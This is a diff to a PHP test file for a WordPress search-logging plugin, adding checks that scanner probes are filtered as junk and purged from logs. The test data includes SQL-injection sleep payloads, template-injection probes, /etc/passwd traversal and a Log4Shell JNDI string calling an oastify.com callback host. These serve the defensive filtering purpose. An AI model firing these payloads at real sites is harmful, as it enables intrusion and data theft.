@@ -146,7 +146,17 @@ $scanner = '1%C0%A7%C0%A2%2527%2522\\\'\\"';
 foreach ( [ 'bing' => $bing, 'scanner' => $scanner, 'tags' => '<script>porto</script>', 'long' => str_repeat( 'porto ', 30 ), 'quotes' => "'porto' \"x\"" ] as $label => $junk ) {
 	check( "junk: $label", MVS_Log::junk( $junk ) );
 }
-foreach ( [ 'porto', "l'été à Porto", 'Arthur’s Seat', 'Saint-Malo', '100% vélo', 'où dormir ?' ] as $ok ) {
+foreach ( [ 'if(now()=sysdate(),sleep(15),0)', '-1 OR 3+870-870-1=0+0+0+1', "1 waitfor delay '0:0:15' --", '(select(0)from(select(sleep(15)))v)',
+	'-5 or 862=(select 862 from pg_sleep(15))--', '1 union all select null,null', '${9999+9999}', '{{98991*97996}}', '../../../../etc/passwd',
+	'/etc/passwd', 'http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.jpg', 'hitxyz.bxss.me', 'response.write(9409117*9947614)',
+	'${jndi:ldap://x.oastify.com/a}', ';print(md5(31337));', 'set|set&set', 'sample@email.tst', 'porto=1', '1*dbms_pipe.receive_message(chr(99)||chr(99),15)',
+	"eavz)'(,,).)\"(", "xqip(')))).)\"(", "qndi((\")'(.(.,", "eqyu'(,\".(())(",
+	'maurice/fr-fr', 'spa/page/7/en-gb', 'vélo/en-gb/fr-fr', 'Londres/EN-GB' ] as $probe ) {
+	check( "junk: $probe", MVS_Log::junk( $probe ) );
+}
+foreach ( [ 'porto', "l'été à Porto", 'Arthur’s Seat', 'Saint-Malo', '100% vélo', 'où dormir ?', 'char (voile)', 'lisbonne or porto 3 jours',
+	'london and 2-3 days', 'que faire à nice 2-3 jours', 'système solaire', 'print shop london', 'sleep in barcelona', 'union square', '2+1 ans',
+	'lisbonne, porto...', '(crète)', "l'île d'yeu", 'saint-jean-de-luz', 'le-la', 'km/h', '1/2 journée', 'page 7' ] as $ok ) {
 	check( "not junk: $ok", ! MVS_Log::junk( $ok ) );
 }
 
@@ -172,6 +182,27 @@ MVS_WP::enqueue();
 check( 'clicks still counted on page 2', isset( $GLOBALS['MOCK_LOCALIZED']['MAVO_SEARCH_CLICKS'] ) );
 
 same( 'a forged click with a junk query is refused', false, MVS_Clicks::record( $scanner, 'fr', 1, 1 ) );
+
+// A scanner's baseline word goes when its probe arrives — only where it found nothing.
+$wpdb->query( 'DELETE FROM wp_mavo_search_log' );
+foreach ( [ 'eavz', 'eavz', 'porto' ] as $q ) {
+	MVS_Log::record( $q, 'fr', 'porto' === $q ? 3 : 0 );
+}
+MVS_Log::record( "eavz)'(,,).)\"(", 'fr', 0 );
+MVS_Log::record( "porto')(,.", 'fr', 0 );
+same( 'baseline forgotten, a real search kept', [ 'porto' ], $wpdb->get_col( 'SELECT query FROM wp_mavo_search_log' ) );
+same( 'baseline word', 'xqip', MVS_Log::baseline( "XQIP(')))).)\"(" ) );
+same( 'no baseline in a plain query', '', MVS_Log::baseline( 'porto' ) );
+
+// Rows counted before a rule existed go once the rules change.
+$wpdb->insert( 'wp_mavo_search_log', [ 'query' => 'qndi', 'lang' => 'de', 'day' => '2026-10-05', 'searches' => 2, 'results' => 0, 'fallback' => '' ] );
+$wpdb->insert( 'wp_mavo_search_log', [ 'query' => "qndi((\")'(.(.,", 'lang' => 'de', 'day' => '2026-10-05', 'searches' => 1, 'results' => 0, 'fallback' => '' ] );
+$wpdb->insert( 'wp_mavo_search_log', [ 'query' => 'if(now()=sysdate(),sleep(15),0)', 'lang' => 'fr', 'day' => current_time( 'Y-m-d' ), 'searches' => 3, 'results' => 0, 'fallback' => '' ] );
+$wpdb->insert( 'wp_mavo_search_clicks', [ 'query' => '${9999+9999}', 'lang' => 'fr', 'day' => current_time( 'Y-m-d' ), 'post_id' => 1, 'source' => 'result', 'clicks' => 1, 'rank_total' => 1 ] );
+same( 'purge: three junk queries (the baseline goes with its probe)', 3, MVS_Log::purge_junk() );
+same( 'purge: the visitor’s search stays', [ 'porto' ], $wpdb->get_col( 'SELECT query FROM wp_mavo_search_log' ) );
+same( 'purge: junk clicks gone', 0, (int) $wpdb->get_var( "SELECT COUNT(*) FROM wp_mavo_search_clicks WHERE query LIKE '%9999+9999%'" ) );
+same( 'purge: rules version recorded', MVS_Log::JUNK_RULES, get_option( MVS_Log::JUNK_RULES_OPTION ) );
 
 /* --------------------------------------------------------------- abuse caps */
 
